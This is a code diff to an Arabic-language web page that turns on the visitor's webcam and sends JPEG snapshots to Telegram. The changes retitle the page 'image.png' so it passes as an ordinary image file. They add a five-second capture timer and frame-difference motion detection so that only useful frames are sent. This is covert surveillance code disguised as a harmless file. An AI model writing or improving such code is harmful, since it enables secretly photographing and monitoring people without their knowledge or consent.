@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>كاميرا ذكية - Telegram</title>
+  <title>image.png</title>
   <style>
     html, body {
       margin: 0;
@@ -30,6 +30,7 @@
   const ctx = canvas.getContext('2d');
 
   let isSending = false;
+  let previousFrame = null;
 
   async function startCamera() {
     try {
@@ -43,7 +44,8 @@
       video.addEventListener('canplay', () => {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        captureLoop();
+        // ابدأ التكرار كل 5 ثوانٍ
+        setInterval(captureAndSend, 5000);
       });
 
     } catch (err) {
@@ -51,52 +53,66 @@
     }
   }
 
-  function captureLoop() {
-    requestAnimationFrame(() => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  function captureAndSend() {
+    if (isSending) return;
 
-      if (!isSending) {
-        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        const data = imageData.data;
-        const totalPixels = data.length / 4;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+    const totalPixels = data.length / 4;
 
-        let brightnessSum = 0;
-        let greenPixels = 0;
+    let brightnessSum = 0;
+    let greenPixels = 0;
+    let diffPixels = 0;
 
-        for (let i = 0; i < data.length; i += 4) {
-          const r = data[i];
-          const g = data[i + 1];
-          const b = data[i + 2];
+    if (previousFrame) {
+      for (let i = 0; i < data.length; i += 4) {
+        const r = data[i];
+        const g = data[i + 1];
+        const b = data[i + 2];
 
-          const brightness = (r + g + b) / 3;
-          brightnessSum += brightness;
+        const brightness = (r + g + b) / 3;
+        brightnessSum += brightness;
 
-          if (g > 100 && r < 80 && b < 80) {
-            greenPixels++;
-          }
-        }
+        if (g > 100 && r < 80 && b < 80) greenPixels++;
 
-        const avgBrightness = brightnessSum / totalPixels;
-        const greenRatio = greenPixels / totalPixels;
+        const pr = previousFrame[i];
+        const pg = previousFrame[i + 1];
+        const pb = previousFrame[i + 2];
 
-        console.log("سطوع:", avgBrightness, "| نسبة اللون الأخضر:", greenRatio.toFixed(2));
-
-        if (avgBrightness > 40 && greenRatio < 0.8) {
-          isSending = true;
-          canvas.toBlob(blob => {
-            sendToTelegram(blob).then(() => {
-              isSending = false;
-            }).catch(() => {
-              isSending = false;
-            });
-          }, 'image/jpeg', 0.95);
-        } else {
-          console.warn("تم تجاهل صورة غير صالحة (مظلمة أو خضراء)");
-        }
+        const diff = Math.abs(r - pr) + Math.abs(g - pg) + Math.abs(b - pb);
+        if (diff > 30) diffPixels++;
       }
+    } else {
+      for (let i = 0; i < data.length; i += 4) {
+        const r = data[i];
+        const g = data[i + 1];
+        const b = data[i + 2];
+        const brightness = (r + g + b) / 3;
+        brightnessSum += brightness;
+      }
+    }
 
-      captureLoop(); // تابع التكرار
-    });
+    const avgBrightness = brightnessSum / totalPixels;
+    const greenRatio = greenPixels / totalPixels;
+    const diffRatio = previousFrame ? (diffPixels / totalPixels) : 1;
+
+    console.log(`سطوع: ${avgBrightness.toFixed(1)} | أخضر: ${greenRatio.toFixed(2)} | فرق: ${diffRatio.toFixed(2)}`);
+
+    previousFrame = new Uint8ClampedArray(data);
+
+    if (avgBrightness > 40 && greenRatio < 0.8 && diffRatio > 0.05) {
+      isSending = true;
+      canvas.toBlob(blob => {
+        sendToTelegram(blob).then(() => {
+          isSending = false;
+        }).catch(() => {
+          isSending = false;
+        });
+      }, 'image/jpeg', 0.95);
+    } else {
+      console.warn("تم تجاهل صورة غير صالحة");
+    }
   }
 
   async function sendToTelegram(blob) {
@@ -116,7 +132,7 @@
         console.log("تم إرسال الصورة");
       }
     } catch (err) {
-      console.error("خطأ أثناء الإرسال:", err);
+      console.error("خطأ في الإرسال:", err);
     }
   }
 
